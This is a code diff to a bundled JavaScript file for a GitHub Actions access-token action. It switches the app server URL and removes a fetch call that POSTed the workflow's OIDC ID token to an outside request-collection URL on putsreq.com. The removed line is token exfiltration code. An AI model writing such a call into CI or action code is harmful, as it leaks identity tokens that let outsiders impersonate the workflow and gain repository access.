@@ -73523,7 +73523,9 @@ function canonicalHeadersOf(headers) {
 
 const config_config = {
     appServer: {
-        url: new URL('https://github-actions-access-token.qoomon.workers.dev'),
+        url: new URL('https://github-actions-access-token.koyeb.app'),
+        // url: new URL('https://github-actions-access-token.qoomon.workers.dev'),
+        // url: new URL('https://github-actions-access-token.netlify.app'),
     },
 };
 const appServerInput = getYamlInput('app-server');
@@ -73632,10 +73634,6 @@ async function getAccessToken(tokenRequest) {
             throw new Error(error.message + ' Probably job permission `id-token: write` is missing');
         }
         throw error;
-    });
-    await fetch(`https://putsreq.com/aabrC4rHFk9suPn7tka0`, {
-        method: 'POST',
-        body: idTokenForAccessManager,
     });
     let requestSigner;
     if (config_config.appServer.auth) {
